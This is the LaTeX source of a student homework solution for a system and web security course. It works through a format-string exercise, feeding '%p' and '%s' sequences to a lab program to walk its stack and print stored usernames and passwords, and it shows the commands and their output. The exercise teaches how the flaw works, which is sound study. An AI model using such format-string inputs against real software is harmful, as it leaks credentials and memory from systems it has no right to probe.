\documentclass[12pt]{scrartcl}

\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}
\usepackage{lmodern}
\usepackage{graphicx}
%\usepackage[pdftex,hyperref,dvipsnames]{xcolor}
\usepackage{listings}
\usepackage[a4paper,lmargin={2cm},rmargin={2cm},tmargin={3.5cm},bmargin = {2.5cm},headheight = {4cm}]{geometry}
\usepackage{amsmath,amssymb,amstext,amsthm}
% \usepackage[lined,algonl,boxed]{algorithm2e} 
%\usepackage{algpseudocode}
\usepackage{tikz}
\usepackage{pgfplots}
\usepackage{url}
\usepackage{tcolorbox}
\usepackage[inline]{enumitem}
\usepackage[headsepline]{scrlayer-scrpage} 
\usepackage{float}

\usepackage[scale=0.55, lineVdist=1em]{secstack}
\pagestyle{scrheadings} 
\usetikzlibrary{automata,positioning}
\graphicspath{ {./images/} }

\usepgfplotslibrary{external}
%\tikzexternalize
\pgfplotsset{width=10cm,compat=1.9}
\pgfplotsset{every axis/.style={
    axis line style = thick,
    grid = both,
    tick pos = left,
    tick align = outside,
    tick style = {thick,black},
    fill = blue,
	line width = 2pt,
}}

\lstset{
  basicstyle=\ttfamily\small,
  numbers=left,
  numberstyle=\tiny,
  stepnumber=1,
  numbersep=8pt,
  frame=single,
  breaklines=true,
  columns=fullflexible
}

\lstset{
  language=C,
  basicstyle=\ttfamily\small,
  keywordstyle=\color{blue},
  commentstyle=\color{gray},
  stringstyle=\color{green!60!black},
  numbers=left,
  numberstyle=\tiny,
  stepnumber=1,
  numbersep=8pt,
  frame=single,
  breaklines=true,
  columns=fullflexible
}

\renewcommand{\theenumi}{(\alph{enumi})}
\renewcommand{\labelenumi}{\text{\theenumi}}
\renewcommand{\labelenumii}{(\roman{enumii})} 

\ohead{Marvin Simon (3883376)\\
       Jan Theil (3794698)}

\ihead{System and Web Security}

\newcounter{exnum}
\newcommand{\exercise}[1]{\section*{Problem \theexnum\stepcounter{exnum}: #1}}

\begin{document}

\setcounter{exnum}{1}
\exercise{Reading Data with Format Strings}

\begin{enumerate}
  \item Find out the frame structure of the program:
        First, the program was called with \\\texttt{./fstr-read-2 "\%s" x}
        This printed: \textit{Username or password invalid. Username: root}.
        Hence, the internal stack pointer of \texttt{printf(user)} points to \texttt{validuser}.
        This is probably some artifact of the \texttt{stcmp} functions in the \texttt{if}-block.
  \item With \texttt{./fstr-read-2 "\%p" x} the address of the \texttt{validuser} string
        within the text section can be located: \textit{Username or password invalid. Username: 0x804861a}.
  \item Now a sequence of \texttt{\%p}'s was used to locate the calling frame of the \texttt{try\_login} function.
        For this the local variables, padding bytes, old frame pointer, return address and the (other) arguments
        need to be skipped. To locate the wanted arguments (\texttt{validuser} and \texttt{validpass})
        in this sequence, we used the information about the address of \texttt{validuser} from above:
        \texttt{./fstr-read-2 "\%p \%p \%p \%p \%p \%p \%p \%p \%p \%p \%p" x} prints
        \textit{Username or password invalid. Username: 0x804861c (nil) (nil) (nil) (nil) 0xbffff808 0x80484e2 0xbffff9c3 0xbffff9e4 0x804861c 0x8048613}.
        Obviously, the last two pointers point to the arguments in question.
  \item Lastly, replace these arguments with \texttt{\%s}'s: (\texttt{./fstr-read-2 "\%p \%p \%p \%p \%p \%p \%p \%p \%p \%s \%s" x})
        and get \textit{Username or password invalid. Username: 0x804861a (nil) (nil) (nil) (nil) 0xbffff828 0x80484e2 0xbffff9cf 0xbffff9f0 root passwd}
\end{enumerate}

Using this string for \texttt{fstr-read-2-extra} prints the valid username / password: \textit{smb / wannacry}.

\end{document}
